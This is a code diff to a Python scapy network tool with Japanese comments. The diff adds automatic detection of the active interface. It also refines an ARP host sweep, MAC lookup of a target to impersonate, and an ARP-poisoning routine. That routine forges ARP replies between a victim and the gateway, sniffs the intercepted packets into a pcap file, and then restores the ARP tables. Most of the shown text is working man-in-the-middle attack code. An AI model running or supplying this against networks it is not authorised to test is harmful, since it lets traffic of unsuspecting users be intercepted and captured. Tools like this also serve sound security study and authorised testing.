@@ -17,18 +17,57 @@ from scapy.all import *
 from tqdm import tqdm
 
 
+_cached_interface_details = None
+_cached_interface_name = None
+
+def get_active_network_info():
+    """
+    Determines the active network interface and its details.
+    Tries to find the interface associated with the default gateway first.
+    If not found, falls back to the first non-loopback interface with an IPv4 address and broadcast.
+    Caches the result to avoid repeated lookups.
+    Returns a tuple: (address_info_dict, interface_name_string)
+    Raises Exception if no suitable interface is found.
+    """
+    global _cached_interface_details, _cached_interface_name
+    if _cached_interface_details and _cached_interface_name:
+        return _cached_interface_details, _cached_interface_name
+
+    try:
+        gws = netifaces.gateways()
+        default_gw_info = gws.get('default', {}).get(netifaces.AF_INET)
+        if default_gw_info:
+            interface_name = default_gw_info[1]
+            if_addrs = netifaces.ifaddresses(interface_name).get(netifaces.AF_INET)
+            if if_addrs:
+                for addr_info in if_addrs:
+                    if 'addr' in addr_info and 'broadcast' in addr_info:
+                        _cached_interface_details = addr_info
+                        _cached_interface_name = interface_name
+                        return _cached_interface_details, _cached_interface_name
+    except Exception:
+        # Problem getting gateway, fallback to iterating interfaces
+        pass
+
+    for interface_name in netifaces.interfaces():
+        if_addrs = netifaces.ifaddresses(interface_name).get(netifaces.AF_INET)
+        if if_addrs:
+            for addr_info in if_addrs:
+                if 'addr' in addr_info and 'broadcast' in addr_info and addr_info['addr'] != '127.0.0.1':
+                    _cached_interface_details = addr_info
+                    _cached_interface_name = interface_name
+                    return _cached_interface_details, _cached_interface_name
+
+    raise Exception("Could not determine a suitable active network interface with IP and broadcast address.")
+
 # 自身のIPアドレスを取得する
 def get_own_ip():
-    ip = netifaces.ifaddresses("en0")[netifaces.AF_INET][0]["addr"]
-    return ip
-
+    details, _ = get_active_network_info()
+    return details['addr']
 
 def get_broadcastaddr():
-    broadcastaddr = netifaces.ifaddresses("en0")[netifaces.AF_INET][0][
-        "broadcast"
-    ]
-    return broadcastaddr
-
+    details, _ = get_active_network_info()
+    return details['broadcast']
 
 # IPアドレスのネットワーク部を特定する．
 def get_network_part(my_ipaddr):
@@ -58,6 +97,7 @@ def get_network_part(my_ipaddr):
 # ICMPでブロードキャストを流し，返答を受け取ることで各種アドレスを特定
 def get_addr(network_part, start, end):
     # 現在はTypeC,192だけに対応．ARPを送って，返信があるアドレスはデバイスが存在するアドレス．
+    _, active_interface = get_active_network_info()
     # ネットワーク部だけ入力してもらって，後は繰り返す？ 192.168.1.0~192.168.1.254みたいに．
     # broadcast_ipaddr =
     receives_ICMP = []
@@ -75,7 +115,7 @@ def get_addr(network_part, start, end):
         print("現在探索中のアドレスは{}".format(dst_addr))
 
         frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=dst_addr)
-        receive = srp1(frame, timeout=0.1, iface="en0")
+        receive = srp1(frame, timeout=0.1, iface=active_interface, verbose=0)
         try:
             receives_ARP.append(receive[Ether].src)
         except:
@@ -216,11 +256,13 @@ def port_scan(ip, port=0, port_end=65535):
 
 # macアドレスの取得
 # なりすましたい対象のipアドレスからMACアドレスを取得する
-def get_mac(ip_address):
+def get_mac(ip_address, interface):
     responses, unanswered = srp(
         Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
         timeout=2,
         retry=10,
+        iface=interface,
+        verbose=0
     )
     for s, r in responses:
         return r[Ether].src
@@ -228,31 +270,31 @@ def get_mac(ip_address):
 
 
 # 偽ARPテーブル作成
-def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
-    poison_target = ARP()
-    poison_target.op = 2
-    poison_target.psrc = gateway_ip
-    poison_target.pdst = target_ip
-    poison_target.hwdst = target_mac
+def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, stop_event, interface):
+    poison_target_pkt = ARP()
+    poison_target_pkt.op = 2
+    poison_target_pkt.psrc = gateway_ip
+    poison_target_pkt.pdst = target_ip
+    poison_target_pkt.hwdst = target_mac
 
-    poison_gateway = ARP()
-    poison_gateway.op = 2
-    poison_gateway.psrc = target_ip
-    poison_gateway.pdst = gateway_ip
-    poison_gateway.hwdst = gateway_mac
+    poison_gateway_pkt = ARP()
+    poison_gateway_pkt.op = 2
+    poison_gateway_pkt.psrc = target_ip
+    poison_gateway_pkt.pdst = gateway_ip
+    poison_gateway_pkt.hwdst = gateway_mac
 
+    print(f"Starting ARP poisoning on interface {interface} between {target_ip} and {gateway_ip}...")
     # arpぽいぞニング開始
-    while True:
-        send(poison_target)
-        send(poison_gateway)
-        # 終了イベント
-        if stop_event.way.wait(2):
-            break
+    while not stop_event.wait(2): # Check event every 2 seconds
+        send(poison_target_pkt, iface=interface, verbose=0)
+        send(poison_gateway_pkt, iface=interface, verbose=0)
+    print("ARP poisoning stopped.")
     return
 
 
 # arpテーブルリセット
-def reset_target(gateway_ip, gateway_mac, target_ip, target_mac):
+def reset_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
+    print(f"Resetting ARP tables on interface {interface} for {target_ip} and {gateway_ip}...")
     send(
         ARP(
             op=2,
@@ -262,6 +304,8 @@ def reset_target(gateway_ip, gateway_mac, target_ip, target_mac):
             hwsrc=gateway_mac,
         ),
         count=5,
+        iface=interface,
+        verbose=0
     )
     send(
         ARP(
@@ -272,43 +316,62 @@ def reset_target(gateway_ip, gateway_mac, target_ip, target_mac):
             hwsrc=target_mac,
         ),
         count=5,
+        iface=interface,
+        verbose=0
     )
-
+    print("ARP tables reset.")
 
 def arp_poisoning(target_ip, gateway_ip, packet_count=200):
-    host_ip = get_own_ip()
-    interface = "en0"
+    # host_ip = get_own_ip() # Not strictly needed here unless for logging
+    _, interface_name = get_active_network_info()
     packet_count = int(packet_count)
-    conf.iface = interface
+    # conf.iface = interface_name # Set for any scapy functions that might rely on global conf
     conf.verb = 0
 
-    gateway_mac = get_mac(gateway_ip)
+    print(f"Using interface: {interface_name}")
+
+    gateway_mac = get_mac(gateway_ip, interface_name)
 
     # gateway_macなかったら失敗
     if not gateway_mac:
+        print(f"Error: Could not get MAC address for gateway {gateway_ip} on interface {interface_name}.")
         sys.exit(1)
+    print(f"Gateway {gateway_ip} MAC: {gateway_mac}")
 
-    target_mac = get_mac(target_ip)
+    target_mac = get_mac(target_ip, interface_name)
 
     # target_macがなかったら失敗
     if not target_mac:
+        print(f"Error: Could not get MAC address for target {target_ip} on interface {interface_name}.")
         sys.exit(1)
+    print(f"Target {target_ip} MAC: {target_mac}")
 
     stop_event = threading.Event()
     poison_thread = threading.Thread(
         target=poison_target,
-        args=[gateway_ip, gateway_mac, target_ip, target_mac, stop_event],
+        args=(gateway_ip, gateway_mac, target_ip, target_mac, stop_event, interface_name),
     )
     poison_thread.start()
 
-    packets = sniff(count=packet_count, iface=interface)
+    print(f"Sniffing {packet_count} packets on interface {interface_name}...")
+    try:
+        # Sniff packets, but also check stop_event periodically via stop_filter
+        # and use a timeout as a fallback for sniff completion.
+        # Adjust timeout logic as needed; this is a basic example.
+        # A more robust timeout might be dynamic based on expected packet rate or a very long fixed duration.
+        packets = sniff(count=packet_count, iface=interface_name, stop_filter=lambda p: stop_event.is_set(), timeout=300)
+    finally:
+        # Ensure poisoning stops regardless of how sniff finishes
+        if not stop_event.is_set():
+            print("Sniffing complete or timed out, signaling poison thread to stop...")
+            stop_event.set()
+
+    poison_thread.join() # Wait for poison thread to finish cleanly
 
     wrpcap("file/arper.pcap", packets)
+    print(f"Captured {len(packets)} packets to file/arper.pcap.")
 
-    stop_event.set()
-    poison_thread.join()
-
-    reset_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    reset_target(gateway_ip, gateway_mac, target_ip, target_mac, interface_name)
 
 
 if __name__ == "__main__":
